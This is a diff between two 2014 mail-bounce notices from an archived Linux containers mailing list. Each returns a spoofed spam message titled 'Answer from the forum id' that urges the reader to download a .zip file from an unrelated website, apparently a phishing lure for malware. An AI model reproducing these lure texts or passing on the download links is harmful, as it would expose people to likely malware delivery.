@@ -1,13 +1,11 @@
-From: <postmaster-r/hrRpLWRXfvnOemgxGiVw@public.gmane.org>
-Subject: Undeliverable: Answer from the forum id r8ikZIOC
-Date: Sun, 20 Jul 2014 12:35:26 +1000
-Message-ID: <39cbe55d-ad95-4fb4-b6e4-aab0d3b4d9aa@metier3.com.au>
-References: <007a01cfa3c2$d0da8b00$0200a8c0@192.168.80.51>
+From: Mail Delivery System <Mailer-Daemon-TpNjKypSJ6ycFfPs7xyXgUEOCMrvLtNR@public.gmane.org>
+Subject: Mail delivery failed: returning message to sender
+Date: Sun, 20 Jul 2014 19:35:33 +0100
+Message-ID: <E1X8vxN-0001hj-RR@cpanel01.vipvoz.com>
 Mime-Version: 1.0
-Content-Type: multipart/mixed; boundary="===============5316359480129620385=="
+Content-Type: text/plain; charset="us-ascii"
+Content-Transfer-Encoding: 7bit
 Return-path: <containers-bounces-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>
-Content-Language: en-US
-In-Reply-To: <007a01cfa3c2$d0da8b00$0200a8c0-Q0ErXNX1RuZ70hCUoeWH/A@public.gmane.org>
 List-Unsubscribe: <https://lists.linuxfoundation.org/mailman/options/containers>,
 	<mailto:containers-request-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org?subject=unsubscribe>
 List-Archive: <http://lists.linuxfoundation.org/pipermail/containers/>
@@ -20,117 +18,70 @@ Errors-To: containers-bounces-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public
 To: containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org
 List-Id: containers.vger.kernel.org
 
---===============5316359480129620385==
-Content-Type: multipart/report; report-type=delivery-status;
-	boundary="40fad54e-5ff9-4b10-a1e3-699e0b307358"
-Content-Language: en-US
+This message was created automatically by mail delivery software.
 
---40fad54e-5ff9-4b10-a1e3-699e0b307358
-Content-Type: text/plain; charset="us-ascii"
-Content-Transfer-Encoding: quoted-printable
+A message that you sent could not be delivered to one or more of its
+recipients. This is a permanent error. The following address(es) failed:
 
-Delivery has failed to these recipients or groups:
+  losm-a6zuFhQLFziNj/U4rqCi8A@public.gmane.org
+    This address no longer accepts mail."
 
-rtrajcevskidd-r/hrRpLWRXfvnOemgxGiVw@public.gmane.org<mailto:rtrajcevskidd-r/hrRpLWRXfvnOemgxGiVw@public.gmane.org>
-The e-mail address you entered couldn't be found. Please check the recipien=
-t's e-mail address and try to resend the message. If the problem continues,=
- please contact your helpdesk.
+------ This is a copy of the message, including all the headers. ------
 
-
-
-
-
-
-
-Diagnostic information for administrators:
-
-Generating server: metier3.com.au
-
-rtrajcevskidd-r/hrRpLWRXfvnOemgxGiVw@public.gmane.org
-#550 5.1.1 RESOLVER.ADR.RecipNotFound; not found ##
-
-Original message headers:
-
-Received: from 192.168.80.51 (46.20.226.75) by M3-M01.M3D.local (192.168.2.=
-15)
- with Microsoft SMTP Server id 14.1.438.0; Sun, 20 Jul 2014 12:35:25 +1000
-Received: from [192.168.80.51] by 192.168.80.51 id xk44Jq2OfqiANIna; Sun, 2=
-0
- Jul 2014 03:32:17 +0100
-Message-ID: <007a01cfa3c2$d0da8b00$0200a8c0-Q0ErXNX1RuZ70hCUoeWH/A@public.gmane.org>
-From: Gianina <containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>
-To: <rtrajcevskidd-r/hrRpLWRXfvnOemgxGiVw@public.gmane.org>
-Subject: Answer from the forum id r8ikZIOC
-Date: Sun, 20 Jul 2014 03:32:17 +0100
+Return-path: <containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>
+Received: from aspammx1.vipvoz.com ([94.46.143.237]:45589)
+	by cpanel01.vipvoz.com with esmtps (TLSv1:DHE-RSA-AES256-SHA:256)
+	(Exim 4.82)
+	(envelope-from <containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>)
+	id 1X8vxN-0001hf-Lx
+	for losm-a6zuFhQLFziNj/U4rqCi8A@public.gmane.org; Sun, 20 Jul 2014 19:35:33 +0100
+Received: from mail.plhosted.com ([46.20.226.75] helo=192.168.80.51)
+	by aspam2.vipvoz.com with esmtp (Exim 4.82)
+	(envelope-from <containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>)
+	id 1X8vxG-0007kq-Ss
+	for losm-a6zuFhQLFziNj/U4rqCi8A@public.gmane.org; Sun, 20 Jul 2014 19:35:27 +0100
+Received: from [192.168.80.51] by 192.168.80.51 id oiSLyTdIPne; Sun, 20 Jul 2014 19:35:32 +0100
+Message-ID: <004101cfa449$615bae80$01000a0a-Q0ErXNX1RuZ70hCUoeWH/A@public.gmane.org>
+From: "Rosa" <containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>
+To: <losm-a6zuFhQLFziNj/U4rqCi8A@public.gmane.org>
+Subject: Answer from the forum id 38xuZAqMRl
+Date: Sun, 20 Jul 2014 19:35:32 +0100
 MIME-Version: 1.0
-Content-Type: text/plain; charset=3D"UTF-8"
+Content-Type: text/plain;
+	charset="UTF-8"
 Content-Transfer-Encoding: 8bit
-X-WatchGuard-Spam-ID: str=3D0001.0A150202.53CB2A32.007E,ss=3D1,re=3D0.000,f=
-gs=3D0
-X-WatchGuard-Spam-Score: 4, clean
-X-WatchGuard-Mail-Client-IP: 46.20.226.75
-X-WatchGuard-Mail-From: containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org
-X-WatchGuard-Mail-Recipients: rtrajcevskidd-r/hrRpLWRXfvnOemgxGiVw@public.gmane.org
-X-WatchGuard-AntiVirus: part scanned. clean action=3Dallow
-Return-Path: containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org
+Received-SPF: fail (aspam2.vipvoz.com: domain of lists.linux-foundation.org does not designate 46.20.226.75 as permitted sender) client-ip=46.20.226.75; envelope-from=containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org; helo=192.168.80.51;
+X-SPF-Result: aspam2.vipvoz.com: domain of lists.linux-foundation.org does not designate 46.20.226.75 as permitted sender
+X-Whitelisted: recipient
+X-DKIM-Status: none /  / lists.linux-foundation.org /  /  / 
+X-Filter-ID: XtLePq6GTMn8G68F0EmQvUy1TURgLZGtBlbqxVOMnQqc4b7EDSoutnKmFnlPKsIWoQfc5HpZrgOD
+ EEgYVScsdlQW70n9oKSh0gu+5OcZDwcRm/D09ggq9D6sh8Uy5FETtp2inkd8Gy6z/ECoqjyTp271
+ 7olIv0ebfopGkXcsPwD9ebH8bqWR7k6cGT3xWx6AmBhM7a1/1SYfmSZK+DDZ90NX0lZWwEZ5aCTH
+ NkQeLf0Z7vzDxvCcMamChE1ESjfRwlmmEyO6tvfwn5wGIl/8hCG7X+t1TW39Ja77LGPpOwChxaeI
+ 9ddBIjfmGTynfuUttGatS10rt65RhnWUgSkt18qiJJInT3pxIYPps8k0ez3Al+rQ2QX3xTdT4YqJ
+ gdmw0NPL1qzw4DF0qdDw//tGI0b8/hiCLCScu2vJMdU5EjIWCXvY6vO/oT6F0MHAmU+SW+LKHlt4
+ Z8rn2rrT0T2zR7zd10//519W/qBJCd94DW0ZjTEJZ+Jqr5kDakIEMEUbgIAKFTP0Li0dN/sGOR+X
+ K2iH1Wgh6RAenBR+licROGY14ql5xR8hmQ0ysdjfW1w5N/ZrZaH22Cp1ZiuHo7zjGQ==
+X-Report-Abuse-To: spam-R7Hwgp2i5sAg8RnBPutEsAC/G2K4zDHf@public.gmane.org
+X-Filter-Fingerprint: cPaH8lomer6UwsJ3BnJDygzLBTZGGjLqKKgmVOShBuW0VFDyP20las9Mq1v6nXmfrqKtWpHLpkE8
+ c09GKJn2t2OZomTHDk91cPirch0MyQuBkvtoLByS8TB6/8s7kBFUpBEcPYduwZ1BYCygCB2qZRHw
+ gN5sJVRUBXXQsgvAzRWCLQVv/6ZfKG/GRXPl/rLOS87bj/itKOZuqddcOCFxx4jdh76ck8EP9/8N
+ 8DjsCyeiQd2LfM1DsvceGTxfmfXSV/23aynHHLpYOYwnpjmJio/RK5MW7/igB3MczWw6pg8LWuN3
+ mGAlisawXmMfLkkH2KU8HSV0tnc/vSXkXWQSAIsryvIGE1YVyTHqSIisChGo6t6zPeynnX2O9ppG
+ C4q9bQIIHOEpeTeXNQjaA+/uT5y0dysObW+FeATgQ6h19cLFQJTJEbzyNpKkv+6fzhTL+bai1ovN
+ fGO3NsYgmZWaqQ==
+X-VipAntiSpam-Class: whitelisted
+X-VipAntiSpam-Evidence: recipient
+X-Recommended-Action: accept
 
+     
 
---40fad54e-5ff9-4b10-a1e3-699e0b307358
-Content-Type: message/delivery-status
+Hi, losm-a6zuFhQLFziNj/U4rqCi8OG/Ez6ZCGd0@public.gmane.org
+     
 
-Reporting-MTA: dns;metier3.com.au
-Received-From-MTA: dns;192.168.80.51
-Arrival-Date: Sun, 20 Jul 2014 02:35:25 +0000
-
-Final-Recipient: rfc822;rtrajcevskidd-r/hrRpLWRXfvnOemgxGiVw@public.gmane.org
-Action: failed
-Status: 5.1.1
-Diagnostic-Code: smtp;550 5.1.1 RESOLVER.ADR.RecipNotFound; not found
-
-
---40fad54e-5ff9-4b10-a1e3-699e0b307358
-Content-Type: message/rfc822
-
-Received: from 192.168.80.51 (46.20.226.75) by M3-M01.M3D.local (192.168.2.15)
- with Microsoft SMTP Server id 14.1.438.0; Sun, 20 Jul 2014 12:35:25 +1000
-Received: from [192.168.80.51] by 192.168.80.51 id xk44Jq2OfqiANIna; Sun, 20
- Jul 2014 03:32:17 +0100
-Message-ID: <007a01cfa3c2$d0da8b00$0200a8c0-Q0ErXNX1RuZ70hCUoeWH/A@public.gmane.org>
-From: Gianina <containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>
-To: <rtrajcevskidd-r/hrRpLWRXfvnOemgxGiVw@public.gmane.org>
-Subject: Answer from the forum id r8ikZIOC
-Date: Sun, 20 Jul 2014 03:32:17 +0100
-MIME-Version: 1.0
-Content-Type: text/plain; charset="UTF-8"
-Content-Transfer-Encoding: quoted-printable
-X-WatchGuard-Spam-ID: str=0001.0A150202.53CB2A32.007E,ss=1,re=0.000,fgs=0
-X-WatchGuard-Spam-Score: 4, clean
-X-WatchGuard-Mail-Client-IP: 46.20.226.75
-X-WatchGuard-Mail-From: containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org
-X-WatchGuard-Mail-Recipients: rtrajcevskidd-r/hrRpLWRXfvnOemgxGiVw@public.gmane.org
-X-WatchGuard-AntiVirus: part scanned. clean action=allow
-Return-Path: containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org
-
-   =20
-Hi, rtrajcevskidd-r/hrRpLWRXe8Icyk09nozA@public.gmane.org
- =20
-On your request we send you a reply.
-http://www.kovolem.cz/Answer.zip
-
-id:212681
+In accordance with your request on the forum will send you a reply on the profile.
+http://www.ortopediabeltran.com.ar/Documentation.zip?id=losm-a6zuFhQLFziNj/U4rqCi8A@public.gmane.org
 
 
 
---40fad54e-5ff9-4b10-a1e3-699e0b307358--
-
---===============5316359480129620385==
-Content-Type: text/plain; charset="us-ascii"
-MIME-Version: 1.0
-Content-Transfer-Encoding: 7bit
-Content-Disposition: inline
-
-_______________________________________________
-Containers mailing list
-Containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org
-https://lists.linuxfoundation.org/mailman/listinfo/containers
---===============5316359480129620385==--
+id:33828452
